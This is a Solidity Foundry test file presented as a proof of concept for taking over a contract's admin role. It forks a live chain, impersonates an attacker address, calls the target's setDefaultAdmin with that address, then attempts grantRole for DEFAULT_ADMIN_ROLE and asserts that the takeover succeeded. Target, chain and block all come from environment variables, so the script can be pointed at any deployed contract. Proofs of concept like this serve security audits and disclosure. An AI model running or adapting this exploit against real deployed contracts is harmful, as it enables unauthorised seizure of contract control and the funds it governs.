// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import "forge-std/console2.sol";

contract PoC_SetDefaultAdmin is Test {
    address public target;
    address public attacker;

    function setUp() public {
        string memory rpc = vm.envString("RPC_URL");
        uint256 blockNum = vm.envUint("BLOCK_NUMBER");
        target = vm.envAddress("TARGET_ADDRESS");
        attacker = vm.envOr("ATTACKER", address(0xBEEF));
        vm.createSelectFork(rpc, blockNum);
    }

    function test_SetDefaultAdmin_Takeover() public {
        vm.startPrank(attacker, attacker);
        (bool success,) = target.call(abi.encodeWithSignature("setDefaultAdmin(address)", attacker));
        console2.log("Called setDefaultAdmin(attacker)");
        console2.log("  success:", success);
        if (success) {
            // Attempt role grant if available
            (bool roleOk, bytes memory roleData) = target.call(abi.encodeWithSignature("DEFAULT_ADMIN_ROLE()"));
            bytes32 roleHash = bytes32(0);
            if (roleOk && roleData.length >= 32) { roleHash = abi.decode(roleData, (bytes32)); }
            (bool grantOk,) = target.call(abi.encodeWithSignature("grantRole(bytes32,address)", roleHash, attacker));
            console2.log("Attempted grantRole(DEFAULT_ADMIN_ROLE, attacker) success:", grantOk);
        }
        vm.stopPrank();
        assertTrue(success, "Takeover failed; target may already be initialized or guarded");
    }
}
